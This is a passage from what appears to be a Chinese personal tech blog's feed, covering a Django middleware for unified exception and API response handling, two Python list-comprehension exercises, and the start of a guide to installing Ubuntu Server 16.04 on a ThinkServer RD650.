class=\"string\">&#x27;Invalid arguments.&#x27;</span>)</span><br><span class=\"line\">\tREQUIRED_ARGUMENT = _(<span class=\"string\">&#x27;A &#123;0&#125; argument is required.&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># view.py</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tuser_name = post_json.get(<span class=\"string\">&#x27;username&#x27;</span>,<span class=\"string\">&#x27;&#x27;</span>)<span class=\"comment\"># required</span></span><br><span class=\"line\">\tpass_word = post_json.get(<span class=\"string\">&#x27;password&#x27;</span>,<span class=\"string\">&#x27;&#x27;</span>)<span class=\"comment\"># required</span></span><br><span class=\"line\">\tuser_type = post_json.get(<span class=\"string\">&#x27;user_type&#x27;</span>,<span class=\"string\">&#x27;&#x27;</span>)<span class=\"comment\"># not required</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"keyword\">not</span> username <span class=\"keyword\">or</span> <span class=\"keyword\">not</span> password:</span><br><span class=\"line\">\t\t<span class=\"keyword\">raise</span> ValidationError(ErrorMsg.REQUIRED_ARGUMENT.<span class=\"built_in\">format</span>(<span class=\"string\">&#x27;username/passswordd&#x27;</span>))</span><br><span class=\"line\">\t...</span><br></pre></td></tr></table></figure></li>\n<li>视图函数中对参数不做校验，只需在中间件添加一句，即可对视图函数中<code>raise</code>的<code>KeyError</code>进行统一处理<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># exception.py</span></span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ValidationError</span>(<span class=\"title class_ inherited__\">BaseException</span>):</span><br><span class=\"line\">\t__msg__ = ErrorMsg.INVALID_ARGUMENT</span><br><span class=\"line\">\t__status__ = <span class=\"number\">1001</span></span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># middleware.py</span></span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">process_exception</span>(<span class=\"params\">self, request, exception</span>):</span><br><span class=\"line\"> <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(exception, KeyError):</span><br><span class=\"line\">\texception = ValidationError(ErrorMsg.REQUIRED_ARGUMENT.<span class=\"built_in\">format</span>(exception))</span><br><span class=\"line\">\t...</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># message.py</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ErrorMsg</span>:</span><br><span class=\"line\">\tUNKNOWN_EXCEPTION= _(<span class=\"string\">&#x27;Unknown exception.&#x27;</span>)</span><br><span class=\"line\">\tINVALID_ARGUMENT = _(<span class=\"string\">&#x27;Invalid arguments.&#x27;</span>)</span><br><span class=\"line\">\tREQUIRED_ARGUMENT = _(<span class=\"string\">&#x27;A &#123;0&#125; argument is required.&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># view.py</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tuser_name = post_json[<span class=\"string\">&#x27;user_name&#x27;</span>] <span class=\"comment\"># required</span></span><br><span class=\"line\">\tuser_type = post_json.get(<span class=\"string\">&#x27;user_type&#x27;</span>,<span class=\"string\">&#x27;&#x27;</span>)<span class=\"comment\"># not required</span></span><br><span class=\"line\">\t...</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"视图函数返回\"><a href=\"#视图函数返回\" class=\"headerlink\" title=\"视图函数返回\"></a>视图函数返回</h2><p>目前视图函数必须有返回值，不能为<code>None</code>，还不知道怎么解决</p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><ul>\n<li><a href=\"https://docs.djangoproject.com/zh-hans/2.1/topics/http/middleware/\">Django 中间件官方文档</a></li>\n<li><a href=\"https://docs.djangoproject.com/zh-hans/2.2/topics/i18n/translation/\">Django 国际化官方文档</a></li>\n<li><a href=\"https://github.com/shaowenchen/django-exceptionbox\">Github项目(django-exceptionbox)</a></li>\n<li><a href=\"https://www.chenshaowen.com/blog/error-code-design-and-unified-processing-in-django.html#32-ExceptionBox\">错误码设计以及 Django 的异常统一处理</a></li>\n<li><a href=\"https://www.cnblogs.com/huchong/p/7819296.html\">Django—-中间件详解</a></li>\n</ul>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"前言公司实习时遇到一个问题:项目中所使用不是Restful API,每个视图函数都要先生成字典，于是项目中便充斥着如下的代码: 123456result=&#123; &quot;msg&quot;:&#x27;xx&quot;, &quot;status&quot;:200, &quot;result&quot;:data&#125;return HttpResponse(json.loads(result)) 维护起来比较麻烦，对前端也很不友好，为了解决该问题，自定义了一个Django中间件对API格式和异常进行统一处理，以此达到如下效果: 在view中只需返回data，raise自定义的异常 实现自定义异常状态码(status)和自定义异常信息(message) view中返回的Object若为Model,则会返回调用其__str__方法的结果 对于view中出现的其他异常，Response会返回Unknown exception 异常信息(message)实现了i18n Django中对异常的处理Django中对request的处理 首先执行process_request函数，然后在执行视图函数之前执行process_view函数，再执行视图函数，最后执行process_response函数 process_request只返回None，所有中间件的process_request执行完之后，就匹配路由，找到对应的视图函数，在执行视图函数之前先执行中间件的 process_view函数 如果process_view返回 None，就继续执行后续的中间件的process_view方法，执行完所有的process_view函数之后执行视图函数 如果其中有个 process_view 返回了 HttpResponse，就不执行后续的 process_view 函数，会跳到第一个 process_response 函数，并继续往下执行 中间件(类)中5种方法中间件中可以定义5个方法: process_request(request) process_view(request, view_func, view_args, view_kwargs) process_exception(request, exception) process_template_response(request, response) process_response(request, response) process_request 中间件在收到request请求之后执行 按照settings.py中MIDDLEWARE_CLASSES的顺序，顺序执行 如果该函数返回None，继续执行后面的中间件的process_request方法 如果该函数返回HttpResponse，则不再继续执行后面的中间件的process_request 方法 process_view 执行完所有中间件的process_request方法 在urls.py中找到对应视图函数 拿到视图函数的名称、参数，在执行视图函数之前执行 如果返回None，则继续执行后面的中间件的process_view函数，然后执行下昂应的视图函数 如果返回HttpResponse，则不执行后续的process_view函数，也不执行视图函数，然后执行所有的response中间件 process_exception 执行视图函数的过程中如果引发异常，则按照settings.py中MIDDLEWARE_CLASSES的顺序，倒序执行process_exception方法 如果返回None，继续执行下一个中间件的process_exception方法 如果返回HttpReponse对象，则该中间件上方其他中间件的process_exception方法不会被调用 一旦其中某个中间件有返回值，则调用template_response和response中间件,否则启动默认的异常处理 最后半句个人理解:如果如果所有中间件的process_exception方法都执完后还没有返回值，则启动默认的异常处理 process_template_response 在视图函数执行结束之后执行 response是Django视图或者某一中间件的返回值(TemplateResponse对象或等价) 只有response实现了render方法才会执行 一旦所有的中间件的template_response被执行完，则调用render方法 按照中间件的顺序，倒序执行 process_response 在视图函数执行结束之后执行 必须有返回值，且返回类型必须是HttpResponse对象 按照中间件的顺序，倒序执行 代码实现文件 middleware.py123456789101112131415161718192021222324from django.utils.deprecation import MiddlewareMixinfrom django.models import modelsfrom django.core.serializers.json import DjangoJSONEncoderfrom django.http import JsonResponseclass MyMiddleware(MiddlewareMixin): def process_exception(self, request, exception): if not isinstance(exception, BaseException): if settings.DEBUG: return JsonResponse(&#123;&#x27;result&#x27;: &#x27;&#x27;, &#x27;msg&#x27;: str(exception), &#x27;status&#x27;: 1000&#125;) else: return JsonResponse(UnknownException().as_dict()) else: return JsonResponse(exception.as_dict()) def process_response(self, request, response): procese_type = (list, tuple, dict, str, int) if isinstance(response, models.Model): response = str(response) if isinstance(response, procese_type): ret = &#123;&#x27;result&#x27;: response, &#x27;msg&#x27;: &#x27;success&#x27;, &#x27;status&#x27;: 200&#125; return JsonResponse(ret, encoder=DjangoJSONEncoder) else: return response exceptions.py1234567891011121314151617181920212223from abc import ABCMetafrom .message import ErrorMsgclass InterFaceAsDictInterFace: def as_dict(self): ret = &#123;&#x27;result&#x27;: &#x27;&#x27;, &#x27;msg&#x27;: getattr(self, &#x27;__msg__&#x27;, &#x27;&#x27;), &#x27;status&#x27;: getattr(self, &#x27;__status__&#x27;, &#x27;&#x27;)&#125; return retclass BaseException(Exception, InterFaceAsDictInterFace): __metaclass__ = ABCMeta def __init__(self, msg=None): super(BaseException, self).__init__() if msg is not None: self.__msg__ = msgclass UnknownException(InterFaceAsDictInterFace): __status__ = 1000 __msg__ = ErrorMsg.UNKNOWN_EXCEPTIONclass MyException(BaseException): __status__=1001 __msg__=ErrorMsg.MY_EXCEPTION message.py 1234from django.utils.translation import gettext as _class ErrorMsg: UNKNOWN_EXCEPTION= _(&#x27;Unknown exception.&#x27;) MY_EXCEPTION = _(&#x27;Test exception.&#x27;) 修改settings文件修改setting中的MIDDLEWARE_CLASSES变量 12345678910MIDDLEWARE = [ &#x27;django.middleware.security.SecurityMiddleware&#x27;, &#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;, &#x27;django.middleware.common.CommonMiddleware&#x27;, &#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;, &#x27;django.contrib.auth.middleware.AuthenticationMiddleware&#x27;, &#x27;django.contrib.messages.middleware.MessageMiddleware&#x27;, &#x27;django.middleware.clickjacking.XFrameOptionsMiddleware&#x27;, &#x27;middleware.MyMiddleware&#x27;,] Todo对前端Post请求进行参数校验目前想出来了两种策略(假设post_json为序列化后的字典): 视图函数中使用get从字典中获取参数，判断required的参数是否为空，raise自定义的异常，如:1234567891011121314151617181920212223# exception.py...class ValidationError(BaseException): __msg__ = ErrorMsg.INVALID_ARGUMENT __status__ = 1001...# message.pyclass ErrorMsg: UNKNOWN_EXCEPTION= _(&#x27;Unknown exception.&#x27;) INVALID_ARGUMENT = _(&#x27;Invalid arguments.&#x27;) REQUIRED_ARGUMENT = _(&#x27;A &#123;0&#125; argument is required.&#x27;)# view.pydef test(request): ... user_name = post_json.get(&#x27;username&#x27;,&#x27;&#x27;)# required pass_word = post_json.get(&#x27;password&#x27;,&#x27;&#x27;)# required user_type = post_json.get(&#x27;user_type&#x27;,&#x27;&#x27;)# not required if not username or not password: raise ValidationError(ErrorMsg.REQUIRED_ARGUMENT.format(&#x27;username/passswordd&#x27;)) ... 视图函数中对参数不做校验，只需在中间件添加一句，即可对视图函数中raise的KeyError进行统一处理123456789101112131415161718192021222324252627# exception.py...class ValidationError(BaseException): __msg__ = ErrorMsg.INVALID_ARGUMENT __status__ = 1001...# middleware.py...def process_exception(self, request, exception): if isinstance(exception, KeyError): exception = ValidationError(ErrorMsg.REQUIRED_ARGUMENT.format(exception)) ...# message.pyclass ErrorMsg: UNKNOWN_EXCEPTION= _(&#x27;Unknown exception.&#x27;) INVALID_ARGUMENT = _(&#x27;Invalid arguments.&#x27;) REQUIRED_ARGUMENT = _(&#x27;A &#123;0&#125; argument is required.&#x27;)# view.pydef test(request): ... user_name = post_json[&#x27;user_name&#x27;] # required user_type = post_json.get(&#x27;user_type&#x27;,&#x27;&#x27;)# not required ... 视图函数返回目前视图函数必须有返回值，不能为None，还不知道怎么解决 参考文献 Django 中间件官方文档 Django 国际化官方文档 Github项目(django-exceptionbox) 错误码设计以及 Django 的异常统一处理 Django—-中间件详解","summary":"前言公司实习时遇到一个问题:项目中所使用不是Restful API,每个视图函数都要先生成字典，于是项目中便充斥着如下的代码: 123456result=&#123; &quot;msg&quot;:&#x27;xx&quot;, &quot;status&quot;:200, &quot;result&quot;:data&#125;return HttpResponse(json.loads(result))","date_published":"2019-10-04T09:56:00.000Z","tags":["Django","Python","API","Django"]},{"id":"https://zhaoqi.vip/posts/2604890615/","url":"https://zhaoqi.vip/posts/2604890615/","title":"人生苦短，我用Python","content_html":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>前几日代写留学生作业时遇到了两道很有意思的Python编程题，在此做一记录，主要涉及到一些Python的高级特性:生成器、lambda表达式。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"Question-1\"><a href=\"#Question-1\" class=\"headerlink\" title=\"Question 1\"></a>Question 1</h1><h2 id=\"题意\"><a href=\"#题意\" class=\"headerlink\" title=\"题意\"></a>题意</h2><p><strong>原文:</strong><br>Consider the following function</p>\n<div class='spoiler collapsed'>\n    <div class='spoiler-title'>\n        Code\n    </div>\n    <div class='spoiler-content'>\n        <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># listOfNumbers is a list of only numbers</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">processList</span>(<span class=\"params\">listOfNumbers</span>):</span><br><span class=\"line\">    result = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> listOfNumbers:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i&lt;<span class=\"number\">0</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            result.append(i*i)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            result.append((i*i)+<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br></pre></td></tr></table></figure>\n    </div>\n</div>\n\n<p>First, study and test processList(listOfNumbers) to determine what it does Then rewrite its body so that it accomplishes the same task with a one-line list comprehension. Thus, the resulting function will have exactly two lines, the def line and a return line containing a list comprehension expression.<br><strong>翻译:</strong><br>将给出的一个函数变成两行</p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>函数的功能是:遍历listofNumbers中的每一个元素，如果大于等于0，将其变成自己乘以自己，否则变为自己乘自己后再加一。<br>因此，我们可以用到Python中的三元表达式，下面这两种方式是等价的。<br><code>value = true if condition else false</code><br>与</p>\n<div class='spoiler collapsed'>\n    <div class='spoiler-title'>\n        Code\n    </div>\n    <div class='spoiler-content'>\n        <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> condition:</span><br><span class=\"line\">    value = true</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    value = false</span><br></pre></td></tr></table></figure>\n    </div>\n</div>\n\n<h2 id=\"参考答案\"><a href=\"#参考答案\" class=\"headerlink\" title=\"参考答案\"></a>参考答案</h2><div class='spoiler collapsed'>\n    <div class='spoiler-title'>\n        Code\n    </div>\n    <div class='spoiler-content'>\n        <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">processList</span>(<span class=\"params\">listOfNumbers</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [i * i <span class=\"keyword\">if</span> i &gt;= <span class=\"number\">0</span> <span class=\"keyword\">else</span> i * i + <span class=\"number\">1</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> listOfNumbers]</span><br></pre></td></tr></table></figure>\n    </div>\n</div>\n\n<h1 id=\"Question-2\"><a href=\"#Question-2\" class=\"headerlink\" title=\"Question 2\"></a>Question 2</h1><h2 id=\"题意-1\"><a href=\"#题意-1\" class=\"headerlink\" title=\"题意\"></a>题意</h2><p><strong>原文:</strong><br>Implement function processList2(inputList, specialItem, ignoreItems) that returns a new list that contains all the items of inputList (and in the original order) except 1) any that appear in the list ignoreItems, and 2) occurrences of specialItem (if specialItem is not in ignoreItems) should become the string “special” in the new list. Use a one-line list cluoomprehension to construct the new list. Thus, again, the function will have exactly two lines, the def line and a return line containing a list comprehension expression. For example,</p>\n<div class=\"note default no-icon\">\n            <p>processList2([1,2,3,4], 4, [3])<br>[1, 2, ‘special’]<br>processList2([1,2,3,4,True,’dog’], 4, [3,5,4])<br>[1, 2, True, ‘dog’]<br>processList2([1,1,2,2], 1, [2])<br>[‘special’, ‘special’]</p>\n          </div>\n<p><strong>翻译:</strong><br>实现函数processList2(inputList, specialItem, ignoreItems)，对inputList中的元素进行处理，返回一个新列表，但需满足以下两个要求:</p>\n<ol>\n<li>不能是出现在ignoreItems中的元素</li>\n<li>对于与specialItem相同的元素(不能在ignoreItems中出现)，将其变成”special”。</li>\n</ol>\n<h2 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析\"></a>分析</h2><ol>\n<li>首先将不在ignoreItems中的那些元素筛出来<code>[x for x in inputList if x not in ignoreItems]</code>或<code>list(filter(lambda x:False if x in ignoreItems else True,inputList))</code>。</li>\n<li>然后遍历上述列表中的元素，将specialItem变成”special”,<code>[&quot;special&quot; if x == specialItem else x for x in xxx]</code></li>\n</ol>\n<h2 id=\"参考答案-1\"><a href=\"#参考答案-1\" class=\"headerlink\" title=\"参考答案\"></a>参考答案</h2><div class='spoiler collapsed'>\n    <div class='spoiler-title'>\n        Code\n    </div>\n    <div class='spoiler-content'>\n        <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">processList2</span>(<span class=\"params\">inputList, specialItem, ignoreItems</span>):</span><br><span class=\"line\">    <span class=\"comment\">## two method</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> [<span class=\"string\">&quot;special&quot;</span> <span class=\"keyword\">if</span> x == specialItem <span class=\"keyword\">else</span> x <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">list</span>(<span class=\"built_in\">filter</span>(<span class=\"keyword\">lambda</span> x:<span class=\"literal\">False</span> <span class=\"keyword\">if</span> x <span class=\"keyword\">in</span> ignoreItems <span class=\"keyword\">else</span> <span class=\"literal\">True</span>,inputList))]</span><br><span class=\"line\">    <span class=\"keyword\">return</span>[<span class=\"string\">&quot;special&quot;</span> <span class=\"keyword\">if</span> x == specialItem <span class=\"keyword\">else</span> x <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> [x <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> inputList <span class=\"keyword\">if</span> x <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> ignoreItems]]</span><br></pre></td></tr></table></figure>\n    </div>\n</div>\n\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><ul>\n<li><a href=\"http://www.runoob.com/python3/python3-func-filter.html\">filter() 函数</a></li>\n<li><a href=\"https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001431779637539089fd627094a43a8a7c77e6102e3a811000\">列表生成式</a></li>\n</ul>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"前言前几日代写留学生作业时遇到了两道很有意思的Python编程题，在此做一记录，主要涉及到一些Python的高级特性:生成器、lambda表达式。 Question 1题意原文:Consider the following function Code 12345678910# listOfNumbers is a list of only numbers#def processList(listOfNumbers): result = [] for i in listOfNumbers: if i&lt;0 == 0: result.append(i*i) else: result.append((i*i)+1) return result First, study and test processList(listOfNumbers) to determine what it does Then rewrite its body so that it accomplishes the same task with a one-line list comprehension. Thus, the resulting function will have exactly two lines, the def line and a return line containing a list comprehension expression.翻译:将给出的一个函数变成两行 分析函数的功能是:遍历listofNumbers中的每一个元素，如果大于等于0，将其变成自己乘以自己，否则变为自己乘自己后再加一。因此，我们可以用到Python中的三元表达式，下面这两种方式是等价的。value = true if condition else false与 Code 1234if condition: value = trueelse: value = false 参考答案 Code 12def processList(listOfNumbers): return [i * i if i &gt;= 0 else i * i + 1 for i in listOfNumbers] Question 2题意原文:Implement function processList2(inputList, specialItem, ignoreItems) that returns a new list that contains all the items of inputList (and in the original order) except 1) any that appear in the list ignoreItems, and 2) occurrences of specialItem (if specialItem is not in ignoreItems) should become the string “special” in the new list. Use a one-line list cluoomprehension to construct the new list. Thus, again, the function will have exactly two lines, the def line and a return line containing a list comprehension expression. For example, processList2([1,2,3,4], 4, [3])[1, 2, ‘special’]processList2([1,2,3,4,True,’dog’], 4, [3,5,4])[1, 2, True, ‘dog’]processList2([1,1,2,2], 1, [2])[‘special’, ‘special’] 翻译:实现函数processList2(inputList, specialItem, ignoreItems)，对inputList中的元素进行处理，返回一个新列表，但需满足以下两个要求: 不能是出现在ignoreItems中的元素 对于与specialItem相同的元素(不能在ignoreItems中出现)，将其变成”special”。 分析 首先将不在ignoreItems中的那些元素筛出来[x for x in inputList if x not in ignoreItems]或list(filter(lambda x:False if x in ignoreItems else True,inputList))。 然后遍历上述列表中的元素，将specialItem变成”special”,[&quot;special&quot; if x == specialItem else x for x in xxx] 参考答案 Code 1234def processList2(inputList, specialItem, ignoreItems): ## two method return [&quot;special&quot; if x == specialItem else x for x in list(filter(lambda x:False if x in ignoreItems else True,inputList))] return[&quot;special&quot; if x == specialItem else x for x in [x for x in inputList if x not in ignoreItems]] 参考资料 filter() 函数 列表生成式","summary":"前言前几日代写留学生作业时遇到了两道很有意思的Python编程题，在此做一记录，主要涉及到一些Python的高级特性:生成器、lambda表达式。","date_published":"2019-03-19T14:01:00.000Z","tags":["Python","Python","lambda"]},{"id":"https://zhaoqi.vip/posts/560540611/","url":"https://zhaoqi.vip/posts/560540611/","title":"ThinkServer RD650安装Ubuntu Server 16.04","content_html":"<h2 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2><ol>\n<li>在Ubuntu官网上下载Ubuntu Server 16.04的ISO镜像(<a href=\"http://releases.ubuntu.com/16.04/\">下载链接</a>)；</li>\n<li>使用刻录软件(如:软碟通)将iso镜像文件写入U盘中，制成启动盘；</li>\n<li>将ISO镜像文件拷贝至U盘的根目录，为了方便后续操作，这里可将镜像文件重命名为<code>Ubuntu.iso</code>；<span id=\"more\"></span></li>\n</ol>\n<h2 id=\"设置引导\"><a href=\"#设置引导\" class=\"headerlink\" title=\"设置引导\"></a>设置引导</h2><ol>\n<li>按电源键开机，启动服务器(服务器启动可能会比较缓慢)；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134039.jpg)</li>\n<li>出现此界面时，按”F10”进入TDM(ThinkServer Deployment Manager)；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134100.jpg)</li>\n<li>进入TDM后，选择”BIOS Setup(BIOS 设置)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134421.jpg)</li>\n<li>选择”Boot Manager(引导管理)”,将”Boot Mode(引导模式)”改为”UEFI Only(仅UEFI模式)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134519.jpg)</li>\n<li>点击”Save &amp; Reset(保存 &amp; 重启)”,在弹出的对话框中选择”Yes(是)”重启电脑。如果出现如下对话框，选择”No(否)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134545.jpg)</li>\n</ol>\n<h2 id=\"开始安装\"><a href=\"#开始安装\" class=\"headerlink\" title=\"开始安装\"></a>开始安装</h2><ol>\n<li>将U盘插入服务器后的USB插槽中，重启服务器，进入下图所示界面。选择”Install Ubuntu Server(安装Ubuntu服务器版)”；<br>注:若无法进入下图所示界面，请进入BIOS修改U盘为第一启动项。<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165615.jpg)</li>\n<li>选择安装过程和系统的默认语言为”English(英语)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165649.jpg)</li>\n<li>“Select your location(选择你的区域)”，这里选择”Other(其他)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153430.jpg)</li>\n<li>“Continent or region(大陆或地区)”选择”Asia(亚洲)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153439.jpg)</li>\n<li>“Country(国家)”选择”China(中国)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153448.jpg)</li>\n<li>是否通过一系列的按键检测键盘布局，选择”NO(否)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165712.jpg)</li>\n<li>字符集编码选择”United States -en_US.UTF-8”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153454.jpg)</li>\n<li>“Country or Region for the keyboard(键盘布局所属国家或地区)”,选择”English(US)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165717.jpg)</li>\n<li>“Keyboard layout(键盘布局)”，选择”English(US)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165725.jpg)</li>\n<li>稍等片刻，将会显示出现错误,原因为:安装程序未检测到CD-ROM。是否重试，选择”No(否)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165744.jpg)</li>\n<li>进入如下界面，选择”Execute a shell(运行shell)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165801.jpg)</li>\n<li>在shell中依次输入如下命令:<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls /dev/sd*</span><br><span class=\"line\">umount /dev/sdb4/</span><br><span class=\"line\">mkdir udev</span><br><span class=\"line\">mount /dev/sdb4 /udev</span><br><span class=\"line\">mount /udev/ubuntu.iso /cdrom</span><br><span class=\"line\">exit</span><br></pre></td></tr></table></figure>\n一般会出现两个<code>/dev/sdb*</code>项，我们选择带数字的那一项去替换上面代码中的<code>/dev/sdb4</code>;<br><code>ubuntu.iso</code>为U盘中Ubuntu Server的ISO镜像的文件名”。<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165911.jpg)</li>\n<li>进入如下界面后，选择”Detect and mount CD-ROM(探测并挂载光盘)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165919.jpg)</li>\n<li>进入如下界面，选择”Network interface(网络接口)”，这里选择第一个网络接口，等待安装程序自动完成配置；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165949.jpg)</li>\n<li>设置”Hostname(主机名)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170037.jpg)</li>\n<li>设置”Full name for the new user(新用户的全名)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170121.jpg)</li>\n<li>设置”Username for your account(你账号的用户名)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170137.jpg)</li>\n<li>设置”password for the new user(新用户的密码)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170145.jpg)</li>\n<li>如果所设置的密码较为简单，可能会弹出如下对话框，询问你是否使用一个”weak password(弱口令)”，选择”Yes(是)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170157.jpg)</li>\n<li>出现如下界面，询问你是否”Encrypt your home directory(加密你的主目录)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170208.jpg)</li>\n<li>然后可能会出现时区设置错误，选择 “Continue(继续)”,进入如下界面，选择”Install the system(安装系统)”,然后直接回车，选择”Partion disks(磁盘分区)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170228.jpg)<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170234.jpg)</li>\n<li>出现下图界面，询问你是否”Umount partitions that are in use(卸载正在使用的分区)”，选择”Yes(是)”；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170255.jpg)</li>\n<li>选择”Partitioning method(分区方法)”，这里我们选择”Guided - use entire disk and set up 